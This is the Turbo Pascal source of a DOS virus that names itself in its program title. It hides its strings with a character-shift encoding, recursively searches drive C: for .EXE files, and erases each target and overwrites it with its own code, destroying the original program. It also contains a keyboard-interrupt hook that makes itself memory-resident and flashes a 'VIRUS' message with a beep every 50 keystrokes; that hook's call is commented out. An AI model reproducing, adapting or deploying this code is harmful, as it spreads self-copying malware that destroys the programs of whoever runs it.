program Virus_askaris_made_in_iran_hamadan_mohamad_saleh_souzanchi;
{$M $9000,0,0}
Uses
    Dos,Crt;
const
      a1: array [1..28] of char =(chr(27),(chr(ord('I')+1)),(chr(ord(#32)+1))
     ,(chr(ord('A')+1)),(chr(ord('M')+1)),(chr(ord(' ')+1)),(chr(ord('V')+1))
     ,(chr(ord('I')+1)),(chr(ord('R')+1)),(chr(ord('U')+1)),(chr(ord('S')+1))
     ,(chr(ord(' ')+1)),(chr(ord('A')+1)),(chr(ord('S')+1)),(chr(ord('K')+1))
     ,(chr(ord('A')+1)),(chr(ord('R')+1)),(chr(ord('E')+1)),(chr(ord('S')+1))
     ,(chr(ord(' ')+1)),(chr(ord('V')+1)),(chr(ord('1')+1)),(chr(ord('.')+1))
     ,(chr(ord('1')+1)),(chr(ord('.')+1)),(chr(ord('.')+1)),(chr(ord('!')+1))
     ,(chr(ord('?')+1)));
     path1:array [1..4] of char=(char(3),(chr(ord('C')+1)),(chr(ord(':')+1)),
                                (chr(ord('\')+1)));
     pfile1:array [1..6] of char=(char(5),(chr(ord('*')+1)),(chr(ord('.')+1)),
                  (chr(ord('E')+1)),(chr(ord('X')+1)),(chr(ord('E')+1)));
     TESTFILE:array [1..5] of char=(char(4),(chr(ord('P')+1)),(chr(ord('2')+1)),
                  (chr(ord('0')+1)),(chr(ord('0')+1)));
                       nashan:string[4]='P200';
Type
    FName = String[12];
VAR
   code           : string[28] absolute a1;
   code1           : string[4] absolute path1;
   code2           : string[6] absolute pfile1;
   CODE3           : string[5] absolute TESTFILE;

      KbdIntVec      : Procedure;
   magmo,sum,sum1,segC, OfsC : Word;
   I,EndStr       : Byte;
   uncode,uncode1,uncode2,uncode3         : string[28];
   file_virus,path_new_file_virus:STRING;
(* ************************************************************************ *)
procedure vv ( X, Y : ShortInt; BG, FG : Byte; Const S : String );
var
   SegC, OfsC : Word;
   I, EndStr  : Byte;
begin
     SegC   := $B800;
     OfsC   := ( Y - 1 ) * 160 + X * 2 - 2;
     EndStr := Ord ( code[0] );
     For I  := 1 To EndStr Do
         Begin
              MemW[SegC:OfsC] := ( BG ShL 4 + FG ) ShL 8 + Ord ( code[i] );
              Inc ( OfsC, 2 );
         End;
end;
{$F+}
procedure Keyclick; interrupt;
var
   q,z:byte;
begin
     if Port[$60] < $80 then sum:=sum+1;
     if sum = 50  then
        begin
             q :=random(61);
             z :=random(24);
             VV ( q, z,0 ,7, uncode );
             sound(200);
             delay (50);
             nosound;
             sum:=0;
        end;
     inline ($9C);
     KbdIntVec;
end;
{$F-}
procedure mogem;
begin
     randomize;
     GetIntVec($9,@KbdIntVec);
     SetIntVec($9,Addr(Keyclick));
     Keep(3);
end;
(* ************************************************************************ *)
Function FindFile ( Dir : DirStr; Name : FName ) : String;
procedure copy;
var
 F1,F2         :FILE;
  CH            :ARRAY[1..7800] OF char;
  a:string;
  RESULT        :INTEGER;
begin
                ASSIGN(F1,file_virus);
                 ASSIGN(F2,path_new_file_virus);
                 setfattr(f2,0);
                 erase(f2);
                 RESET (F1);
                 REWRITE(F2);
                 BLOCKREAD(F1,CH,57,RESULT);
                 BLOCKWRITE(F2,CH,57,RESULT);
                 CLOSE(F1);
                 CLOSE(F2);
end;
(* *********************************************************************** *)
procedure test;
var
f :file of char;
ss: string[4];
a:boolean;
begin
ASSIGN(F,path_new_file_virus);
 magmo:=0;
SETFATTR(F,0);
reset (f);
ss[0]:=#4;
SEEK(F,6530-4);
a:=false;
if filesize(f)=7296 then
while not eof(f) do
begin
      read(f,ss[4]);
      for i:=2 to 4 do
      ss[i-1]:=ss[i];
      IF ss=UNCODE3 THEN
      BEGIN
      a:=false;
      exit;
      END
      ELSE
      begin
      a:=true;
      end;
        end;
        if a=true then
        begin
        close(f);
        copy;
        magmo:=magmo+1;
        end
      else
      begin
      copy;
      magmo:=magmo+1;
      end;
end;
(* *********************************************************************** *)
Var
  R             : SearchRec;
 Begin
      FindFirst ( Dir + Name, AnyFile, R );
      While DosError = 0 do
            Begin
                if magmo=1 then exit;
                 path_new_file_virus:=DIR+r.name;
                 test;
                 FindNext(R);
            end;
      FindFirst ( Dir +'*.*', ANYFILE, R );
      While DosError = 0 Do
            Begin
                 If ( R.Attr And Directory = Directory ) And
                    ( R.Name <> '.' ) And ( R.Name <> '..' ) Then
                    FindFile := FindFile ( Dir + R.Name + '\', Name );
                 FindNext ( R );
            End;
 end;
(* ************************************************************************ *)
Begin
file_virus:=PARAMSTR(0);
MAGMO:=0;
     clrscr;
      for i:=1 to length(code) do
        begin
              code[i]:= char(ord(code[i])-1);
              uncode:=uncode+code[i];
         end;
         {******************************}

     {***************************}
      for i:=1 to length(code1) do
        begin
              code1[i]:= char(ord(code1[i])-1);
              uncode1:=uncode1+code1[i];
         end;
         {*****************************}
        for i:=1 to length(code3) do
        begin
              code3[i]:= char(ord(code3[i])-1);
              uncode3:=uncode3+code3[i];
         end;
         {******************************}
 for i:=1 to length(code2) do
        begin
              code2[i]:= char(ord(code2[i])-1);
              uncode2:=uncode2+code2[i];
         end;
         {******************************}
     FindFile ( uncode1, uncode2 );
{     mogem;}
     nashan:='';
End.
